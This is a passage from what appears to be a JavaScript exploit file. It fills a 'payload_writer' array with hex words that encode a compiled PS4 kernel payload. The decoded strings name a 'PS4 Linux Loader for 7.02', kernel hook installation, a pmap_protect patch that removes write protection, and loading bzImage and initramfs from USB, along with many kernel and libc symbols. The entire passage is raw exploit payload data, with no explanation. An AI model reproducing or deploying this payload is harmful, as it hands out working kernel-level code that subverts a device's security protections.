  payload_writer[4252] = 0x58454b34;
  payload_writer[4253] = 0x4b004345;
  payload_writer[4254] = 0x00435845;
  payload_writer[4255] = 0x6c696146;
  payload_writer[4256] = 0x74206465;
  payload_writer[4257] = 0x6c61206f;
  payload_writer[4258] = 0x61636f6c;
  payload_writer[4259] = 0x25206574;
  payload_writer[4260] = 0x2064757a;
  payload_writer[4261] = 0x65747962;
  payload_writer[4262] = 0x6b000a73;
  payload_writer[4263] = 0x656e7265;
  payload_writer[4264] = 0x6f685f6c;
  payload_writer[4265] = 0x695f6b6f;
  payload_writer[4266] = 0x6174736e;
  payload_writer[4267] = 0x25286c6c;
  payload_writer[4268] = 0x25202c70;
  payload_writer[4269] = 0x000a2970;
  payload_writer[4270] = 0x3d3d3d0a;
  payload_writer[4271] = 0x3d3d3d3d;
  payload_writer[4272] = 0x3d3d3d3d;
  payload_writer[4273] = 0x3d3d3d3d;
  payload_writer[4274] = 0x3d3d3d3d;
  payload_writer[4275] = 0x57203d3d;
  payload_writer[4276] = 0x494e5241;
  payload_writer[4277] = 0x3d20474e;
  payload_writer[4278] = 0x3d3d3d3d;
  payload_writer[4279] = 0x3d3d3d3d;
  payload_writer[4280] = 0x3d3d3d3d;
  payload_writer[4281] = 0x3d3d3d3d;
  payload_writer[4282] = 0x3d3d3d3d;
  payload_writer[4283] = 0x6f68000a;
  payload_writer[4284] = 0x74206b6f;
  payload_writer[4285] = 0x65677261;
  payload_writer[4286] = 0x75662074;
  payload_writer[4287] = 0x6974636e;
  payload_writer[4288] = 0x61206e6f;
  payload_writer[4289] = 0x65726464;
  payload_writer[4290] = 0x203a7373;
  payload_writer[4291] = 0x000a7025;
  payload_writer[4292] = 0x6c207449;
  payload_writer[4293] = 0x736b6f6f;
  payload_writer[4294] = 0x6b696c20;
  payload_writer[4295] = 0x65772065;
  payload_writer[4296] = 0x20657227;
  payload_writer[4297] = 0x6e6e7572;
  payload_writer[4298] = 0x20676e69;
  payload_writer[4299] = 0x6d6f7266;
  payload_writer[4300] = 0x65737520;
  payload_writer[4301] = 0x6e616c72;
  payload_writer[4302] = 0x656d2064;
  payload_writer[4303] = 0x79726f6d;
  payload_writer[4304] = 0x50000a2e;
  payload_writer[4305] = 0x7361656c;
  payload_writer[4306] = 0x75722065;
  payload_writer[4307] = 0x6874206e;
  payload_writer[4308] = 0x63207369;
  payload_writer[4309] = 0x2065646f;
  payload_writer[4310] = 0x6d6f7266;
  payload_writer[4311] = 0x6b206120;
  payload_writer[4312] = 0x656e7265;
  payload_writer[4313] = 0x656d206c;
  payload_writer[4314] = 0x79726f6d;
  payload_writer[4315] = 0x70616d20;
  payload_writer[4316] = 0x676e6970;
  payload_writer[4317] = 0x000a0a2e;
  payload_writer[4318] = 0x73552020;
  payload_writer[4319] = 0x20676e69;
  payload_writer[4320] = 0x69623436;
  payload_writer[4321] = 0x62612074;
  payload_writer[4322] = 0x756c6f73;
  payload_writer[4323] = 0x6a206574;
  payload_writer[4324] = 0x0a706d75;
  payload_writer[4325] = 0x616d7000;
  payload_writer[4326] = 0x72705f70;
  payload_writer[4327] = 0x6365746f;
  payload_writer[4328] = 0x6d702874;
  payload_writer[4329] = 0x202c7061;
  payload_writer[4330] = 0x202c7025;
  payload_writer[4331] = 0x202c7025;
  payload_writer[4332] = 0x0a296425;
  payload_writer[4333] = 0x72656b00;
  payload_writer[4334] = 0x5f6c656e;
  payload_writer[4335] = 0x74696e69;
  payload_writer[4336] = 0x000a2928;
  payload_writer[4337] = 0x6e72654b;
  payload_writer[4338] = 0x62206c65;
  payload_writer[4339] = 0x20657361;
  payload_writer[4340] = 0x6e207369;
  payload_writer[4341] = 0x6120746f;
  payload_writer[4342] = 0x6e67696c;
  payload_writer[4343] = 0x000a6465;
  payload_writer[4344] = 0x6e72654b;
  payload_writer[4345] = 0x62206c65;
  payload_writer[4346] = 0x20657361;
  payload_writer[4347] = 0x6c25203d;
  payload_writer[4348] = 0x000a786c;
  payload_writer[4349] = 0x65726944;
  payload_writer[4350] = 0x6d207463;
  payload_writer[4351] = 0x62207061;
  payload_writer[4352] = 0x20657361;
  payload_writer[4353] = 0x6c25203d;
  payload_writer[4354] = 0x000a786c;
  payload_writer[4355] = 0x83f08944;
  payload_writer[4356] = 0x700006e0;
  payload_writer[4357] = 0x5f70616d;
  payload_writer[4358] = 0x746f7270;
  payload_writer[4359] = 0x20746365;
  payload_writer[4360] = 0x63746170;
  payload_writer[4361] = 0x75732068;
  payload_writer[4362] = 0x73656363;
  payload_writer[4363] = 0x6c756673;
  payload_writer[4364] = 0x6f662820;
  payload_writer[4365] = 0x20646e75;
  payload_writer[4366] = 0x25207461;
  payload_writer[4367] = 0x000a2970;
  payload_writer[4368] = 0x74736554;
  payload_writer[4369] = 0x20676e69;
  payload_writer[4370] = 0x626f6c67;
  payload_writer[4371] = 0x76206c61;
  payload_writer[4372] = 0x61697261;
  payload_writer[4373] = 0x20656c62;
  payload_writer[4374] = 0x65636361;
  payload_writer[4375] = 0x28207373;
  payload_writer[4376] = 0x74697277;
  payload_writer[4377] = 0x72702065;
  payload_writer[4378] = 0x6365746f;
  payload_writer[4379] = 0x6e6f6974;
  payload_writer[4380] = 0x2e2e2e29;
  payload_writer[4381] = 0x4b4f000a;
  payload_writer[4382] = 0x4b000a2e;
  payload_writer[4383] = 0x656e7265;
  payload_writer[4384] = 0x6e69206c;
  payload_writer[4385] = 0x66726574;
  payload_writer[4386] = 0x20656361;
  payload_writer[4387] = 0x74696e69;
  payload_writer[4388] = 0x696c6169;
  payload_writer[4389] = 0x0a64657a;
  payload_writer[4390] = 0x616d7000;
  payload_writer[4391] = 0x72705f70;
  payload_writer[4392] = 0x6365746f;
  payload_writer[4393] = 0x61702074;
  payload_writer[4394] = 0x20686374;
  payload_writer[4395] = 0x6c696166;
  payload_writer[4396] = 0x0a216465;
  payload_writer[4397] = 0x696c2f00;
  payload_writer[4398] = 0x2f343662;
  payload_writer[4399] = 0x6c2d646c;
  payload_writer[4400] = 0x78756e69;
  payload_writer[4401] = 0x3638782d;
  payload_writer[4402] = 0x2e34362d;
  payload_writer[4403] = 0x322e6f73;
  payload_writer[4404] = 0x00000000;
  payload_writer[4405] = 0x00000000;
  payload_writer[4406] = 0x00000000;
  payload_writer[4407] = 0x00000000;
  payload_writer[4408] = 0x00000000;
  payload_writer[4409] = 0x00000000;
  payload_writer[4410] = 0x00000000;
  payload_writer[4411] = 0x00000000;
  payload_writer[4412] = 0x00000000;
  payload_writer[4413] = 0x00000001;
  payload_writer[4414] = 0x00000001;
  payload_writer[4415] = 0x00000001;
  payload_writer[4416] = 0x00000000;
  payload_writer[4417] = 0x00000000;
  payload_writer[4418] = 0x00000000;
  payload_writer[4419] = 0x00000000;
  payload_writer[4420] = 0x00000000;
  payload_writer[4421] = 0x00000000;
  payload_writer[4422] = 0x00000000;
  payload_writer[4423] = 0x00000000;
  payload_writer[4424] = 0x00000000;
  payload_writer[4425] = 0x00000000;
  payload_writer[4426] = 0x00000000;
  payload_writer[4427] = 0x00000000;
  payload_writer[4428] = 0x00000000;
  payload_writer[4429] = 0x00000000;
  payload_writer[4430] = 0x00000000;
  payload_writer[4431] = 0x00000000;
  payload_writer[4432] = 0x00000000;
  payload_writer[4433] = 0x00000000;
  payload_writer[4434] = 0x00000000;
  payload_writer[4435] = 0x00000000;
  payload_writer[4436] = 0x00000000;
  payload_writer[4437] = 0x00000000;
  payload_writer[4438] = 0x00000000;
  payload_writer[4439] = 0x00000000;
  payload_writer[4440] = 0x00000000;
  payload_writer[4441] = 0x00000000;
  payload_writer[4442] = 0x00000000;
  payload_writer[4443] = 0x00000000;
  payload_writer[4444] = 0x00000000;
  payload_writer[4445] = 0x00000000;
  payload_writer[4446] = 0x00000000;
  payload_writer[4447] = 0x00000000;
  payload_writer[4448] = 0x00000000;
  payload_writer[4449] = 0x00000000;
  payload_writer[4450] = 0x00000000;
  payload_writer[4451] = 0x00000000;
  payload_writer[4452] = 0x00000000;
  payload_writer[4453] = 0x00000000;
  payload_writer[4454] = 0x00000000;
  payload_writer[4455] = 0x00000000;
  payload_writer[4456] = 0x00000000;
  payload_writer[4457] = 0x00000000;
  payload_writer[4458] = 0x00000000;
  payload_writer[4459] = 0x00000000;
  payload_writer[4460] = 0x00000000;
  payload_writer[4461] = 0x00000000;
  payload_writer[4462] = 0x00000000;
  payload_writer[4463] = 0x00000000;
  payload_writer[4464] = 0x00000000;
  payload_writer[4465] = 0x00000000;
  payload_writer[4466] = 0x00000000;
  payload_writer[4467] = 0x00000000;
  payload_writer[4468] = 0x00000000;
  payload_writer[4469] = 0x00000000;
  payload_writer[4470] = 0x00000000;
  payload_writer[4471] = 0x00000000;
  payload_writer[4472] = 0x00000000;
  payload_writer[4473] = 0x00000000;
  payload_writer[4474] = 0x00000000;
  payload_writer[4475] = 0x00000000;
  payload_writer[4476] = 0x00000000;
  payload_writer[4477] = 0x00000000;
  payload_writer[4478] = 0x00000000;
  payload_writer[4479] = 0x00000000;
  payload_writer[4480] = 0x00000000;
  payload_writer[4481] = 0x00000000;
  payload_writer[4482] = 0x00000000;
  payload_writer[4483] = 0x00000000;
  payload_writer[4484] = 0x00000000;
  payload_writer[4485] = 0x00000000;
  payload_writer[4486] = 0x00000000;
  payload_writer[4487] = 0x00000000;
  payload_writer[4488] = 0x00000000;
  payload_writer[4489] = 0x00000000;
  payload_writer[4490] = 0x00000000;
  payload_writer[4491] = 0x00000000;
  payload_writer[4492] = 0x00000000;
  payload_writer[4493] = 0x00000000;
  payload_writer[4494] = 0x00000000;
  payload_writer[4495] = 0x00000000;
  payload_writer[4496] = 0x00000000;
  payload_writer[4497] = 0x00000000;
  payload_writer[4498] = 0x00000000;
  payload_writer[4499] = 0x00000000;
  payload_writer[4500] = 0x00000000;
  payload_writer[4501] = 0x00000000;
  payload_writer[4502] = 0x00000000;
  payload_writer[4503] = 0x00000000;
  payload_writer[4504] = 0x00000000;
  payload_writer[4505] = 0x00000000;
  payload_writer[4506] = 0x00000000;
  payload_writer[4507] = 0x00000000;
  payload_writer[4508] = 0x00000000;
  payload_writer[4509] = 0x00000000;
  payload_writer[4510] = 0x00000000;
  payload_writer[4511] = 0x00000000;
  payload_writer[4512] = 0xdeadbeef;
  payload_writer[4513] = 0x00002898;
  payload_writer[4514] = 0x20345350;
  payload_writer[4515] = 0x756e694c;
  payload_writer[4516] = 0x6f4c2078;
  payload_writer[4517] = 0x72656461;
  payload_writer[4518] = 0x726f6620;
  payload_writer[4519] = 0x302e3720;
  payload_writer[4520] = 0x79622032;
  payload_writer[4521] = 0x6c617620;
  payload_writer[4522] = 0x69746e65;
  payload_writer[4523] = 0x6572626e;
  payload_writer[4524] = 0x000a7a69;
  payload_writer[4525] = 0x6e72656b;
  payload_writer[4526] = 0x62206c65;
  payload_writer[4527] = 0x20657361;
  payload_writer[4528] = 0x303a7369;
  payload_writer[4529] = 0x31302578;
  payload_writer[4530] = 0x786c6c36;
  payload_writer[4531] = 0x6175000a;
  payload_writer[4532] = 0x20726464;
  payload_writer[4533] = 0x303a7369;
  payload_writer[4534] = 0x31302578;
  payload_writer[4535] = 0x786c6c36;
  payload_writer[4536] = 0x7325000a;
  payload_writer[4537] = 0x0a0a0a0a;
  payload_writer[4538] = 0x000a0a0a;
  payload_writer[4539] = 0x746e6d2f;
  payload_writer[4540] = 0x6273752f;
  payload_writer[4541] = 0x7a622f30;
  payload_writer[4542] = 0x67616d49;
  payload_writer[4543] = 0x72450065;
  payload_writer[4544] = 0x3a726f72;
  payload_writer[4545] = 0x65706f20;
  payload_writer[4546] = 0x6d2f206e;
  payload_writer[4547] = 0x752f746e;
  payload_writer[4548] = 0x2f306273;
  payload_writer[4549] = 0x6d497a62;
  payload_writer[4550] = 0x2e656761;
  payload_writer[4551] = 0x72724500;
  payload_writer[4552] = 0x203a726f;
  payload_writer[4553] = 0x6e65706f;
  payload_writer[4554] = 0x6e6d2f20;
  payload_writer[4555] = 0x73752f74;
  payload_writer[4556] = 0x692f3062;
  payload_writer[4557] = 0x7274696e;
  payload_writer[4558] = 0x73666d61;
  payload_writer[4559] = 0x6970632e;
  payload_writer[4560] = 0x7a672e6f;
  payload_writer[4561] = 0x6d726400;
  payload_writer[4562] = 0x6964652e;
  payload_writer[4563] = 0x69665f64;
  payload_writer[4564] = 0x61776d72;
  payload_writer[4565] = 0x653d6572;
  payload_writer[4566] = 0x2f646964;
  payload_writer[4567] = 0x30323931;
  payload_writer[4568] = 0x38303178;
  payload_writer[4569] = 0x69622e30;
  payload_writer[4570] = 0x6170206e;
  payload_writer[4571] = 0x3d63696e;
  payload_writer[4572] = 0x6c632030;
  payload_writer[4573] = 0x736b636f;
  payload_writer[4574] = 0x6372756f;
  payload_writer[4575] = 0x743d7365;
  payload_writer[4576] = 0x53006373;
  payload_writer[4577] = 0x79536563;
  payload_writer[4578] = 0x726f4373;
  payload_writer[4579] = 0x62655265;
  payload_writer[4580] = 0x00746f6f;
  payload_writer[4581] = 0x6b62696c;
  payload_writer[4582] = 0x656e7265;
  payload_writer[4583] = 0x65775f6c;
  payload_writer[4584] = 0x70732e62;
  payload_writer[4585] = 0x6c007872;
  payload_writer[4586] = 0x656b6269;
  payload_writer[4587] = 0x6c656e72;
  payload_writer[4588] = 0x7379735f;
  payload_writer[4589] = 0x7270732e;
  payload_writer[4590] = 0x5f5f0078;
  payload_writer[4591] = 0x63617473;
  payload_writer[4592] = 0x68635f6b;
  payload_writer[4593] = 0x75675f6b;
  payload_writer[4594] = 0x00647261;
  payload_writer[4595] = 0x74735f5f;
  payload_writer[4596] = 0x5f6b6361;
  payload_writer[4597] = 0x5f6b6863;
  payload_writer[4598] = 0x6c696166;
  payload_writer[4599] = 0x655f5f00;
  payload_writer[4600] = 0x726f7272;
  payload_writer[4601] = 0x65637300;
  payload_writer[4602] = 0x6e72654b;
  payload_writer[4603] = 0x72456c65;
  payload_writer[4604] = 0x00726f72;
  payload_writer[4605] = 0x4b656373;
  payload_writer[4606] = 0x656e7265;
  payload_writer[4607] = 0x616f4c6c;
  payload_writer[4608] = 0x61745364;
  payload_writer[4609] = 0x6f4d7472;
  payload_writer[4610] = 0x656c7564;
  payload_writer[4611] = 0x65637300;
  payload_writer[4612] = 0x6e72654b;
  payload_writer[4613] = 0x6c416c65;
  payload_writer[4614] = 0x61636f6c;
  payload_writer[4615] = 0x69446574;
  payload_writer[4616] = 0x74636572;
  payload_writer[4617] = 0x6f6d654d;
  payload_writer[4618] = 0x73007972;
  payload_writer[4619] = 0x654b6563;
  payload_writer[4620] = 0x6c656e72;
  payload_writer[4621] = 0x4470614d;
  payload_writer[4622] = 0x63657269;
  payload_writer[4623] = 0x6d654d74;
  payload_writer[4624] = 0x0079726f;
  payload_writer[4625] = 0x4b656373;
  payload_writer[4626] = 0x656e7265;
  payload_writer[4627] = 0x7465476c;
  payload_writer[4628] = 0x65726944;
  payload_writer[4629] = 0x654d7463;
  payload_writer[4630] = 0x79726f6d;
  payload_writer[4631] = 0x657a6953;
  payload_writer[4632] = 0x65637300;
  payload_writer[4633] = 0x6e72654b;
  payload_writer[4634] = 0x74536c65;
  payload_writer[4635] = 0x73007461;
  payload_writer[4636] = 0x654b6563;
  payload_writer[4637] = 0x6c656e72;
  payload_writer[4638] = 0x6e65704f;
  payload_writer[4639] = 0x65637300;
  payload_writer[4640] = 0x6e72654b;
  payload_writer[4641] = 0x65526c65;
  payload_writer[4642] = 0x73006461;
  payload_writer[4643] = 0x654b6563;
  payload_writer[4644] = 0x6c656e72;
  payload_writer[4645] = 0x6565734c;
  payload_writer[4646] = 0x6373006b;
  payload_writer[4647] = 0x72654b65;
  payload_writer[4648] = 0x436c656e;
  payload_writer[4649] = 0x65736f6c;
  payload_writer[4650] = 0x65637300;
  payload_writer[4651] = 0x6e72654b;
  payload_writer[4652] = 0x6c536c65;
  payload_writer[4653] = 0x00706565;
  payload_writer[4654] = 0x4b656373;
  payload_writer[4655] = 0x656e7265;
  payload_writer[4656] = 0x6c73556c;
  payload_writer[4657] = 0x00706565;
  payload_writer[4658] = 0x4b656373;
  payload_writer[4659] = 0x656e7265;
  payload_writer[4660] = 0x7465476c;
  payload_writer[4661] = 0x656d6974;
  payload_writer[4662] = 0x6164666f;
  payload_writer[4663] = 0x63730079;
  payload_writer[4664] = 0x72654b65;
  payload_writer[4665] = 0x476c656e;
  payload_writer[4666] = 0x72507465;
  payload_writer[4667] = 0x7365636f;
  payload_writer[4668] = 0x6d695473;
  payload_writer[4669] = 0x63730065;
  payload_writer[4670] = 0x72654b65;
  payload_writer[4671] = 0x476c656e;
  payload_writer[4672] = 0x75437465;
  payload_writer[4673] = 0x6e657272;
  payload_writer[4674] = 0x75704374;
  payload_writer[4675] = 0x73797300;
  payload_writer[4676] = 0x006c7463;
  payload_writer[4677] = 0x63737973;
  payload_writer[4678] = 0x79626c74;
  payload_writer[4679] = 0x656d616e;
  payload_writer[4680] = 0x73797300;
  payload_writer[4681] = 0x68637261;
  payload_writer[4682] = 0x65786500;
  payload_writer[4683] = 0x00657663;
  payload_writer[4684] = 0x72687470;
  payload_writer[4685] = 0x5f646165;
  payload_writer[4686] = 0x666c6573;
  payload_writer[4687] = 0x68747000;
  payload_writer[4688] = 0x64616572;
  payload_writer[4689] = 0x7465735f;
  payload_writer[4690] = 0x69666661;
  payload_writer[4691] = 0x7974696e;
  payload_writer[4692] = 0x00706e5f;
  payload_writer[4693] = 0x4b656373;
  payload_writer[4694] = 0x656e7265;
  payload_writer[4695] = 0x6572436c;
  payload_writer[4696] = 0x45657461;
  payload_writer[4697] = 0x75657571;
  payload_writer[4698] = 0x63730065;
  payload_writer[4699] = 0x72654b65;
  payload_writer[4700] = 0x446c656e;
  payload_writer[4701] = 0x74656c65;
  payload_writer[4702] = 0x75714565;
  payload_writer[4703] = 0x00657565;
  payload_writer[4704] = 0x4b656373;
  payload_writer[4705] = 0x656e7265;
  payload_writer[4706] = 0x6464416c;
  payload_writer[4707] = 0x72657355;
  payload_writer[4708] = 0x6e657645;
  payload_writer[4709] = 0x63730074;
  payload_writer[4710] = 0x72654b65;
  payload_writer[4711] = 0x416c656e;
  payload_writer[4712] = 0x65526464;
  payload_writer[4713] = 0x76456461;
  payload_writer[4714] = 0x00746e65;
  payload_writer[4715] = 0x75746567;
  payload_writer[4716] = 0x67006469;
  payload_writer[4717] = 0x69677465;
  payload_writer[4718] = 0x65670064;
  payload_writer[4719] = 0x64697074;
  payload_writer[4720] = 0x74657300;
  payload_writer[4721] = 0x00646975;
  payload_writer[4722] = 0x67746573;
  payload_writer[4723] = 0x73006469;
  payload_writer[4724] = 0x65727465;
  payload_writer[4725] = 0x00646975;
  payload_writer[4726] = 0x72746573;
  payload_writer[4727] = 0x64696765;
  payload_writer[4728] = 0x79732f00;
  payload_writer[4729] = 0x6d657473;
  payload_writer[4730] = 0x6d6f632f;
  payload_writer[4731] = 0x2f6e6f6d;
  payload_writer[4732] = 0x2f62696c;
  payload_writer[4733] = 0x5362696c;
  payload_writer[4734] = 0x79536563;
  payload_writer[4735] = 0x69745573;
  payload_writer[4736] = 0x70732e6c;
  payload_writer[4737] = 0x2f007872;
  payload_writer[4738] = 0x74737973;
  payload_writer[4739] = 0x632f6d65;
  payload_writer[4740] = 0x6f6d6d6f;
  payload_writer[4741] = 0x696c2f6e;
  payload_writer[4742] = 0x696c2f62;
  payload_writer[4743] = 0x65635362;
  payload_writer[4744] = 0x74737953;
  payload_writer[4745] = 0x65536d65;
  payload_writer[4746] = 0x63697672;
  payload_writer[4747] = 0x70732e65;
  payload_writer[4748] = 0x73007872;
  payload_writer[4749] = 0x79536563;
  payload_writer[4750] = 0x69745573;
  payload_writer[4751] = 0x6e65536c;
  payload_writer[4752] = 0x73795364;
  payload_writer[4753] = 0x4e6d6574;
  payload_writer[4754] = 0x6669746f;
  payload_writer[4755] = 0x74616369;
  payload_writer[4756] = 0x576e6f69;
  payload_writer[4757] = 0x54687469;
  payload_writer[4758] = 0x00747865;
  payload_writer[4759] = 0x53656373;
  payload_writer[4760] = 0x65747379;
  payload_writer[4761] = 0x7265536d;
  payload_writer[4762] = 0x65636976;
  payload_writer[4763] = 0x6e75614c;
  payload_writer[4764] = 0x65576863;
  payload_writer[4765] = 0x6f724262;
  payload_writer[4766] = 0x72657377;
  payload_writer[4767] = 0x79732f00;
  payload_writer[4768] = 0x6d657473;
  payload_writer[4769] = 0x6d6f632f;
  payload_writer[4770] = 0x2f6e6f6d;
  payload_writer[4771] = 0x2f62696c;
  payload_writer[4772] = 0x5362696c;
  payload_writer[4773] = 0x73556563;
  payload_writer[4774] = 0x65537265;
  payload_writer[4775] = 0x63697672;
  payload_writer[4776] = 0x70732e65;
  payload_writer[4777] = 0x73007872;
  payload_writer[4778] = 0x73556563;
  payload_writer[4779] = 0x65537265;
  payload_writer[4780] = 0x63697672;
  payload_writer[4781] = 0x696e4965;
  payload_writer[4782] = 0x6c616974;
  payload_writer[4783] = 0x00657a69;
  payload_writer[4784] = 0x55656373;
  payload_writer[4785] = 0x53726573;
  payload_writer[4786] = 0x69767265;
  payload_writer[4787] = 0x65476563;
  payload_writer[4788] = 0x676f4c74;
  payload_writer[4789] = 0x73556e69;
  payload_writer[4790] = 0x64497265;
  payload_writer[4791] = 0x7473694c;
  payload_writer[4792] = 0x65637300;
  payload_writer[4793] = 0x72657355;
  payload_writer[4794] = 0x76726553;
  payload_writer[4795] = 0x54656369;
  payload_writer[4796] = 0x696d7265;
  payload_writer[4797] = 0x6574616e;
  payload_writer[4798] = 0x65637300;
  payload_writer[4799] = 0x72657355;
  payload_writer[4800] = 0x76726553;
  payload_writer[4801] = 0x47656369;
  payload_writer[4802] = 0x73557465;
  payload_writer[4803] = 0x614e7265;
  payload_writer[4804] = 0x7300656d;
  payload_writer[4805] = 0x73556563;
  payload_writer[4806] = 0x65537265;
  payload_writer[4807] = 0x63697672;
  payload_writer[4808] = 0x74654765;
  payload_writer[4809] = 0x74696e49;
  payload_writer[4810] = 0x556c6169;
  payload_writer[4811] = 0x00726573;
  payload_writer[4812] = 0x7379732f;
  payload_writer[4813] = 0x2f6d6574;
  payload_writer[4814] = 0x6d6d6f63;
  payload_writer[4815] = 0x6c2f6e6f;
  payload_writer[4816] = 0x6c2f6269;
  payload_writer[4817] = 0x656b6269;
  payload_writer[4818] = 0x6c656e72;
  payload_writer[4819] = 0x7270732e;
  payload_writer[4820] = 0x63730078;
  payload_writer[4821] = 0x72654b65;
  payload_writer[4822] = 0x526c656e;
  payload_writer[4823] = 0x6f6f6265;
  payload_writer[4824] = 0x696c0074;
  payload_writer[4825] = 0x65635362;
  payload_writer[4826] = 0x6d737953;
  payload_writer[4827] = 0x6c75646f;
  payload_writer[4828] = 0x70732e65;
  payload_writer[4829] = 0x73007872;
  payload_writer[4830] = 0x79536563;
  payload_writer[4831] = 0x646f6d73;
  payload_writer[4832] = 0x4c656c75;
  payload_writer[4833] = 0x4d64616f;
  payload_writer[4834] = 0x6c75646f;
  payload_writer[4835] = 0x696c0065;
  payload_writer[4836] = 0x65635362;
  payload_writer[4837] = 0x2e74654e;
  payload_writer[4838] = 0x78727073;
  payload_writer[4839] = 0x65637300;
  payload_writer[4840] = 0x5374654e;
  payload_writer[4841] = 0x656b636f;
  payload_writer[4842] = 0x63730074;
  payload_writer[4843] = 0x74654e65;
  payload_writer[4844] = 0x6b636f53;
  payload_writer[4845] = 0x6c437465;
  payload_writer[4846] = 0x0065736f;
  payload_writer[4847] = 0x4e656373;
  payload_writer[4848] = 0x6f437465;
  payload_writer[4849] = 0x63656e6e;
  payload_writer[4850] = 0x63730074;
  payload_writer[4851] = 0x74654e65;
  payload_writer[4852] = 0x646e6553;
  payload_writer[4853] = 0x65637300;
  payload_writer[4854] = 0x4274654e;
  payload_writer[4855] = 0x00646e69;
  payload_writer[4856] = 0x4e656373;
  payload_writer[4857] = 0x694c7465;
  payload_writer[4858] = 0x6e657473;
  payload_writer[4859] = 0x65637300;
  payload_writer[4860] = 0x4174654e;
  payload_writer[4861] = 0x70656363;
  payload_writer[4862] = 0x63730074;
  payload_writer[4863] = 0x74654e65;
  payload_writer[4864] = 0x76636552;
  payload_writer[4865] = 0x65637300;
  payload_writer[4866] = 0x5374654e;
  payload_writer[4867] = 0x656b636f;
  payload_writer[4868] = 0x6f624174;
  payload_writer[4869] = 0x73007472;
  payload_writer[4870] = 0x654e6563;
  payload_writer[4871] = 0x74654774;
  payload_writer[4872] = 0x6b636f73;
  payload_writer[4873] = 0x656d616e;
  payload_writer[4874] = 0x65637300;
  payload_writer[4875] = 0x4774654e;
  payload_writer[4876] = 0x6f737465;
  payload_writer[4877] = 0x706f6b63;
  payload_writer[4878] = 0x63730074;
  payload_writer[4879] = 0x74654e65;
  payload_writer[4880] = 0x73746553;
  payload_writer[4881] = 0x6f6b636f;
  payload_writer[4882] = 0x73007470;
  payload_writer[4883] = 0x654e6563;
  payload_writer[4884] = 0x656e4974;
  payload_writer[4885] = 0x6f744e74;
  payload_writer[4886] = 0x63730070;
  payload_writer[4887] = 0x74654e65;
  payload_writer[4888] = 0x74656e49;
  payload_writer[4889] = 0x6e6f7450;
  payload_writer[4890] = 0x65637300;
  payload_writer[4891] = 0x4874654e;
  payload_writer[4892] = 0x6c6e6f74;
  payload_writer[4893] = 0x6373006c;
  payload_writer[4894] = 0x74654e65;
  payload_writer[4895] = 0x6e6f7448;
  payload_writer[4896] = 0x6373006c;
  payload_writer[4897] = 0x74654e65;
  payload_writer[4898] = 0x6e6f7448;
  payload_writer[4899] = 0x63730073;
  payload_writer[4900] = 0x74654e65;
  payload_writer[4901] = 0x686f744e;
  payload_writer[4902] = 0x73006c6c;
  payload_writer[4903] = 0x654e6563;
  payload_writer[4904] = 0x6f744e74;
  payload_writer[4905] = 0x73006c68;
  payload_writer[4906] = 0x654e6563;
  payload_writer[4907] = 0x6f744e74;
  payload_writer[4908] = 0x6c007368;
  payload_writer[4909] = 0x63536269;
  payload_writer[4910] = 0x74654e65;
  payload_writer[4911] = 0x2e6c7443;
  payload_writer[4912] = 0x78727073;
  payload_writer[4913] = 0x65637300;
  payload_writer[4914] = 0x4374654e;
  payload_writer[4915] = 0x6e496c74;
  payload_writer[4916] = 0x73007469;
  payload_writer[4917] = 0x654e6563;
  payload_writer[4918] = 0x6c744374;
  payload_writer[4919] = 0x6d726554;
  payload_writer[4920] = 0x65637300;
  payload_writer[4921] = 0x4374654e;
  payload_writer[4922] = 0x65476c74;
  payload_writer[4923] = 0x666e4974;
  payload_writer[4924] = 0x6373006f;
  payload_writer[4925] = 0x68745065;
  payload_writer[4926] = 0x64616572;
  payload_writer[4927] = 0x61657243;
  payload_writer[4928] = 0x73006574;
  payload_writer[4929] = 0x74506563;
  payload_writer[4930] = 0x61657268;
  payload_writer[4931] = 0x69784564;
  payload_writer[4932] = 0x63730074;
  payload_writer[4933] = 0x68745065;
  payload_writer[4934] = 0x64616572;
  payload_writer[4935] = 0x61746544;
  payload_writer[4936] = 0x73006863;
  payload_writer[4937] = 0x74506563;
  payload_writer[4938] = 0x61657268;
  payload_writer[4939] = 0x696f4a64;
  payload_writer[4940] = 0x6373006e;
  payload_writer[4941] = 0x68745065;
  payload_writer[4942] = 0x64616572;
  payload_writer[4943] = 0x6c656959;
  payload_writer[4944] = 0x63730064;
  payload_writer[4945] = 0x68745065;
  payload_writer[4946] = 0x64616572;
  payload_writer[4947] = 0x666c6553;
  payload_writer[4948] = 0x65637300;
  payload_writer[4949] = 0x72687450;
  payload_writer[4950] = 0x43646165;
  payload_writer[4951] = 0x65636e61;
  payload_writer[4952] = 0x6373006c;
  payload_writer[4953] = 0x68745065;
  payload_writer[4954] = 0x64616572;
  payload_writer[4955] = 0x6574754d;
  payload_writer[4956] = 0x696e4978;
  payload_writer[4957] = 0x63730074;
  payload_writer[4958] = 0x68745065;
  payload_writer[4959] = 0x64616572;
  payload_writer[4960] = 0x6574754d;
  payload_writer[4961] = 0x73654478;
  payload_writer[4962] = 0x796f7274;
  payload_writer[4963] = 0x65637300;
  payload_writer[4964] = 0x72687450;
  payload_writer[4965] = 0x4d646165;
  payload_writer[4966] = 0x78657475;
  payload_writer[4967] = 0x6b636f4c;
  payload_writer[4968] = 0x65637300;
  payload_writer[4969] = 0x72687450;
  payload_writer[4970] = 0x4d646165;
  payload_writer[4971] = 0x78657475;
  payload_writer[4972] = 0x6c797254;
  payload_writer[4973] = 0x006b636f;
  payload_writer[4974] = 0x50656373;
  payload_writer[4975] = 0x65726874;
  payload_writer[4976] = 0x754d6461;
  payload_writer[4977] = 0x54786574;
  payload_writer[4978] = 0x64656d69;
  payload_writer[4979] = 0x6b636f6c;
  payload_writer[4980] = 0x65637300;
  payload_writer[4981] = 0x72687450;
  payload_writer[4982] = 0x4d646165;
  payload_writer[4983] = 0x78657475;
  payload_writer[4984] = 0x6f6c6e55;
  payload_writer[4985] = 0x6c006b63;
  payload_writer[4986] = 0x63536269;
  payload_writer[4987] = 0x62694c65;
  payload_writer[4988] = 0x746e4963;
  payload_writer[4989] = 0x616e7265;
  payload_writer[4990] = 0x70732e6c;
  payload_writer[4991] = 0x6d007872;
  payload_writer[4992] = 0x6f6c6c61;
  payload_writer[4993] = 0x72660063;
  payload_writer[4994] = 0x63006565;
  payload_writer[4995] = 0x6f6c6c61;
  payload_writer[4996] = 0x65720063;
  payload_writer[4997] = 0x6f6c6c61;
  payload_writer[4998] = 0x656d0063;
  payload_writer[4999] = 0x696c616d;
  payload_writer[5000] = 0x6d006e67;
  payload_writer[5001] = 0x65736d65;
  payload_writer[5002] = 0x656d0074;
  payload_writer[5003] = 0x7970636d;
  payload_writer[5004] = 0x6d656d00;
